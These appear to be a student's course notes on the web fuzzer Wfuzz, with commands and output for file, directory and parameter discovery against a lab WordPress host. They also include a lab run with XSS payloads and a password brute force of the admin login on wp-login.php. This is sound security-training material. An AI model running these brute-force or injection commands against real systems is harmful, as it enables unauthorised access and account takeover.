This Learning Unit covers the following Learning Objectives:

1. Learn how to discover files using Wfuzz
2. Discover how to find directories with Wfuzz
3. Understand how to discover parameters with Wfuzz
4. Learn how to leverage Wfuzz to fuzz parameters
5. Develop the skills to fuzz POST data using Wfuzz

The next tool we'll examine is _Wfuzz_, which can provide excellent coverage for testing input points on the web surface.

First, let's cover the term _fuzzing_. Fuzzing is a technique that involves sending a large amount of both _valid_ and _invalid_ data in the form of input to an application or a service. A _fuzzer_ is a form of automated software that performs this input testing.

The idea behind sending both valid and invalid data to a target service is that we don't have to worry about the efficacy of our wordlists. The wordlists we use will sometimes work, and sometimes won't - but in any case, fuzzing acts as a low form of automated vulnerability testing. For example, if we want to test a parameter for input sanitization, fuzzing works perfectly because we can test several payloads of our choosing.

---------

#### File Discovery

```bash
kali@kali:~$ export URL="http://offsecwp:80/FUZZ"  
kali@kali:~$ echo $URL                        
http://offsecwp:80/FUZZ
```
`wfuzz` example
- where  `-c` to display color output`
- where  `-z` file to specify the input source`
- where `--hc` to avoid non-existent and erroneous responses

After several minutes, our scan will complete, and we'll notice that files were discovered. We also discovered wp-login.php, a file we identified in previous sections with Burp Suite's Intercept and Repeater. Further there are two reasons that we did not discover directories.
```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/FUZZ
Total requests: 17128

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000028:   200        100 L    450 W      6798 Ch     "wp-login.php"
000000001:   301        0 L      0 W        0 Ch        "index.php"         
000000005:   405        0 L      6 W        42 Ch       "xmlrpc.php"        
000000122:   200        97 L     823 W      7345 Ch     "readme.html"        
000000198:   200        384 L    3177 W     19915 Ch    "license.txt"      
000000255:   200        0 L      0 W        0 Ch        "wp-config.php"   
000000289:   200        4 L      15 W       135 Ch      "wp-trackback.php"    
000000369:   500        0 L      0 W        0 Ch        "wp-settings.php"
000000371:   301        0 L      0 W        0 Ch        "."        
000000405:   200        0 L      0 W        0 Ch        "wp-cron.php" 
000000440:   200        0 L      0 W        0 Ch        "wp-blog-header.php"  
000000454:   200        11 L     23 W       221 Ch      "wp-links-opml.php"
000000830:   200        0 L      0 W        0 Ch        "wp-load.php"      
000001065:   302        0 L      0 W        0 Ch        "wp-signup.php"
000001499:   302        0 L      0 W        0 Ch        "wp-activate.php"                                                                                                 
Total time: 0
Processed Requests: 17128
Filtered Requests: 17113
Requests/sec.: 0
```

First, we did not discover directories because we did not apply a trailing forward slash to our environment variable when fuzzing. Secondly, we specified the correct wordlist for `files`, not directories. This means our output shows which files were found in the web root.

---------
#### Directory Discovery

To find directories using Wfuzz, let's re-export our environment variable with a trailing forward slash. We'll also update the list we're using in our Wfuzz command from `raft-medium-files.txt` to `raft-medium-directories.txt`.

```bash
kali@kali:~$ export URL="http://offsecwp:80/FUZZ/"
```

```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/FUZZ/
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================
000000013:   200        0 L      0 W        0 Ch        "wp-content"
000000020:   302        0 L      0 W        0 Ch        "wp-admin"  

Total time: 0
Processed Requests: 29990
Filtered Requests: 29987
Requests/sec.: 0
```

Because we specified a trailing forward slash, we received the corresponding directories and response codes present in the web root. We also received a `200 OK` response for `/wp-content` and a `302 FOUND` response for `/wp-admin`.

----------
#### Parameter Discovery

It's not uncommon during the early web application enumeration phases, to encounter a file returning a `200 OK` response. This is a normal, expected response for a remote file that exists on the target web server and has access permissions. We should, however, note an important related Learning Module - `Parameter Discovery`.

Let's imagine a scenario in which an organization's web developer has created an application that's ready for security testing. During this phase, we would typically perform some penetration testing to ensure that there are no `hidden parameters` in the web application that could be leveraged maliciously. Such parameters could lead to unintentional public-facing functionality, so we need to make sure there are none present.

The scenario we've imagined represents a very black-box approach to testing. In real world cases, we may be provided the application's source code before our security review - but for now, let's assume we have not been provided the source. We're going to need to check for hidden parameters.

To perform this type of check, we'll need to review the Wfuzz output for any valid response size changes, which would indicate the presence of a hidden parameter. If there are no valid changes in response size, we're in the clear and can expect no potentially hidden parameters. However, there may be such parameters if we perform a parameter discovery attempt using the below wordlist and encounter a change in average response size.

Further, we want to make sure when performing parameter discovery that we utilize the best wordlist we can. For this purpose, we have chosen a wordlist titled `burp-parameter-names.txt`, which contains approximately 2,588 possible parameter names.

```bash
kali@kali:~$ export URL="http://offsecwp:80/index.php?FUZZ=data"
```

```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/index.php?FUZZ=data
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================
000000031:   200        216 L    3219 W     38443 Ch    "s"
000000051:   200        258 L    3358 W     40363 Ch    "preview"
000001169:   200        4 L      15 W       135 Ch      "tb"           
Total time: 0
Processed Requests: 2588
Filtered Requests: 2585
Requests/sec.: 0
```

We indeed found three potential hidden parameters. Although these parameters are not directly exploitable in this scenario, we've still learned the process needed to check an endpoint for hidden parameters that might have either been left behind and not intended for end-user interaction or to serve data processing purposes.

------------
#### Fuzzing Parameter Values

In the following examples, we will practice the basics of fuzzing a single parameter value on a target web application. In this scenario, we will be fuzzing the `fpv` parameter with a common username wordlist.

We will use the `/usr/share/seclists/Usernames/cirt-default-usernames.txt` wordlist for our purposes here. In our Kali Linux VM, let's point Wfuzz at the `http://offsecwp:80/index.php?fpv=FUZZ` endpoint.

```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://offsecwp:80/index.php?fpv=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp:80/index.php?fpv=FUZZ
Total requests: 828

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000015:   301        0 L      0 W        0 Ch        "22222222"
000000035:   301        0 L      0 W        0 Ch        "APPLSYSPUB"
000000036:   301        0 L      0 W        0 Ch        "APPS"
000000034:   301        0 L      0 W        0 Ch        "APPLSYS"
000000003:   301        0 L      0 W        0 Ch        "$SRV"
000000038:   301        0 L      0 W        0 Ch        "AQ"
000000007:   301        0 L      0 W        0 Ch        "(created)"
...
```
We quickly notice that there are a lot of `erroneous responses` with our parameter values (specifically the 301 response code). To exclude these erroneous responses from our Wfuzz output, we will also add the `--hc` option with a value of a `301`.
```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp:80/index.php?fpv=FUZZ
Total requests: 828

=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================
000000791:   200        0 L      1 W        12 Ch       "unix"                                   

Total time: 0
Processed Requests: 828
Filtered Requests: 827
Requests/sec.: 0
```
Sure enough, we discover that the `fpv` parameter returned a different response code (200) and size when the wordlist reached the "unix" keyword.

##### Labs
1.
![[Pasted image 20241203135352.png]]
identifying the `vulnerable` payload in the parameter
```bash
┌──(root💀gobots)-[03Dec2024 18:44:51]-[/usr/share/seclists/Fuzzing]
└─# wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS-Fuzzing --hc 404,301 http://offsecwp/index.php?xss=FUZZ    
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://offsecwp/index.php?xss=FUZZ
Total requests: 3806
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                
=====================================================================
000000309:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000000772:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000001235:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000001698:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000002161:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000002624:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000003087:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000003550:   200        0 L      1 W        12 Ch       "<b <script>alert(1)</script>0"                                                                                                        
000003731:   200        0 L      1 W        12 Ch       "<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>"                   
Total time: 0
Processed Requests: 3792
Filtered Requests: 3783
Requests/sec.: 0
```
utilizing any `payload` to get flag
![[Pasted image 20241203135543.png]]

---------

#### Fuzzing POST data

In this section, we are going to discuss how to fuzz _POST_ data in an HTTP Request. We will also attempt to brute force our way into the WordPress admin page by testing the _admin_ user.

Let's begin by intercepting some data to visually demonstrate the POST data parameters we're interested in. We can simply navigate to `http://offsecwp/wp-login.php` and enable the _Intercept_ feature under the _Proxy_ tab of Burp Suite. We'll then provide some dummy data to demonstrate our example.

![[Pasted image 20241203143213.png]]

bruteforcing `admin password`
- where `-d` to specifically fuzz the POST data
- where  `--hc` with a value of 404 to avoid erroneous responses


```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php         

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp:80/wp-login.php
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000013:   200        105 L    478 W      7201 Ch     "abc123"
000000012:   200        105 L    478 W      7201 Ch     "baseball"
000000010:   200        105 L    478 W      7201 Ch     "dragon"
000000011:   200        105 L    478 W      7201 Ch     "123123"
000000016:   200        105 L    478 W      7201 Ch     "letmein"
000000003:   200        105 L    478 W      7201 Ch     "12345678"
000000014:   200        105 L    478 W      7201 Ch     "football"
000000001:   200        105 L    478 W      7201 Ch     "123456"
000000007:   200        105 L    478 W      7201 Ch     "1234"
000000015:   200        105 L    478 W      7201 Ch     "monkey"
000000009:   200        105 L    478 W      7201 Ch     "1234567"
000000005:   200        105 L    478 W      7201 Ch     "123456789"
000000006:   200        105 L    478 W      7201 Ch     "12345"
000000008:   200        105 L    478 W      7201 Ch     "111111" 
...
```

The above output shows that we receive several erroneous response sizes. Let's correct this by supplying the `--hh` parameter to suppress the response size value of `7201 bytes`, thus filtering our results so only successful attempts are shown in our output.

```bash
kali@kali:~$ export URL="http://offsecwp:80/wp-login.php"

kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" --hh 7201 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/wp-login.php
Total requests: 100000
=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================
000000002:   302        0 L      0 W        0 Ch        "password"  
```

![[Pasted image 20241203143714.png]]


